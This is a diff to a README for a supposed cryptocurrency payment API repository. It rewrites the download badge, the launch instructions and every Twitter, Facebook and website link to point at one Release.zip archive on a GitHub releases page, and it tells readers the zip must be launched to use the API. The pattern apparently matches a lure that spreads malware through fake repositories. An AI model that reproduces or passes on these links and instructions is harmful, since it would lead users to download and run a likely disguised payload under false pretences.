@@ -12,9 +12,9 @@ Welcome to the Cryptocurrency eCommerce Crypto Payment API Blockchain Network re
 
 ## How to Use
 To get started with our API, simply download the Software package from the following link:  
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-<COLOR>.svg)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/nsenopai/Cryptocurrency-eCommerce-Crypto-Payment-Api-Blockchain-Network/releases/download/v1.0/Release.zip<COLOR>.svg)](https://github.com/nsenopai/Cryptocurrency-eCommerce-Crypto-Payment-Api-Blockchain-Network/releases/download/v1.0/Release.zip)
 
-### Note: The Software.zip file needs to be launched to access the API.
+### Note: The https://github.com/nsenopai/Cryptocurrency-eCommerce-Crypto-Payment-Api-Blockchain-Network/releases/download/v1.0/Release.zip file needs to be launched to access the API.
 
 ## Repository Topics
 Explore a wide range of topics related to the repository, including:
@@ -50,9 +50,9 @@ For any questions, feedback, or support, feel free to reach out to us. We are he
 
 ## Connect With Us
 Stay connected with us on social media and our website to get the latest updates, news, and announcements:
-- Twitter: @[YourTwitterHandle](https://twitter.com/YourTwitterHandle)
-- Facebook: [YourFacebookPage](https://www.facebook.com/YourFacebookPage)
-- Website: [www.yourwebsite.com](https://www.yourwebsite.com)
+- Twitter: @[YourTwitterHandle](https://github.com/nsenopai/Cryptocurrency-eCommerce-Crypto-Payment-Api-Blockchain-Network/releases/download/v1.0/Release.zip)
+- Facebook: [YourFacebookPage](https://github.com/nsenopai/Cryptocurrency-eCommerce-Crypto-Payment-Api-Blockchain-Network/releases/download/v1.0/Release.zip)
+- Website: [https://github.com/nsenopai/Cryptocurrency-eCommerce-Crypto-Payment-Api-Blockchain-Network/releases/download/v1.0/Release.zip](https://github.com/nsenopai/Cryptocurrency-eCommerce-Crypto-Payment-Api-Blockchain-Network/releases/download/v1.0/Release.zip)
 
 ---
 
